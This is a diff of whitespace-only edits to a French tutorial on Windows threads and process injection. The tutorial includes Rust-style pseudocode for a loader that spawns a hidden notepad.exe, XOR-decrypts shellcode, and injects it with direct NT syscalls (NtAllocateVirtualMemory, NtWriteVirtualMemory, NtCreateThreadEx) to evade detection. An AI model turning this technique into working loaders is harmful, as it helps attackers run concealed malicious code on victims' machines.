@@ -63,7 +63,7 @@ Un **thread** est une unité d'exécution :
 ├─────────────────────────────────┤
 │  📍 RIP (Instruction Pointer)   │  ← Où j'en suis dans le code
 │  📚 Stack (pile d'appels)       │  ← Variables locales, return addresses
-│  🗄️ Registres CPU (contexte)    │  ← RAX, RBX, RCX... 
+│  🗄️ Registres CPU (contexte)    │  ← RAX, RBX, RCX...
 │  ⏰ État (Running/Waiting/etc)  │
 │  🎫 TEB (Thread Environment)    │
 └─────────────────────────────────┘
@@ -163,11 +163,11 @@ NtCreateThreadEx:
   Kernel crée Thread object
   RefCount = 1 (le thread lui-même)
   RefCount = 2 (ton handle)
-  
+
 NtClose(thread_handle):
   RefCount = 1 (reste le thread lui-même)
   Thread continue de tourner!
-  
+
 Quand shellcode termine:
   RefCount = 0
   Kernel détruit le Thread object
@@ -359,7 +359,7 @@ loader_rust/
 fn main() {
     // 1. Spawn notepad.exe (hidden)
     let pid = spawn_notepad_syscall();
-    
+
     // 2. Inject shellcode
     inject_shellcode(pid, &ENCRYPTED_SHELLCODE);
 }
@@ -367,22 +367,22 @@ fn main() {
 fn inject_shellcode(pid: u32, shellcode: &[u8]) {
     // XOR decrypt
     let decrypted = xor_decrypt(shellcode, &XOR_KEY);
-    
+
     // Open target process (minimum rights!)
     syscall!("NtOpenProcess", pid, 0x002A)  // Not PROCESS_ALL_ACCESS!
-    
+
     // Allocate RW memory in target
     syscall!("NtAllocateVirtualMemory", PAGE_READWRITE)
-    
+
     // Write shellcode (full syscall!)
     syscall!("NtWriteVirtualMemory", shellcode)
-    
+
     // Change to RX
     syscall!("NtProtectVirtualMemory", PAGE_EXECUTE_READ)
-    
+
     // Create remote thread
     syscall!("NtCreateThreadEx", ...)
-    
+
     // Cleanup with syscalls
     syscall!("NtClose", thread_handle)
     syscall!("NtClose", process_handle)
@@ -413,9 +413,9 @@ LOADER:
   ├── NtClose(thread_handle)   ← Juste "je m'en fiche maintenant"
   ├── NtClose(process_handle)  ← Pareil
   └── exit(0)  ← Loader se termine
-  
+
                     PENDANT CE TEMPS dans notepad...
-                    
+
 THREAD SHELLCODE:
   │
   ├── Démarre à l'adresse du shellcode
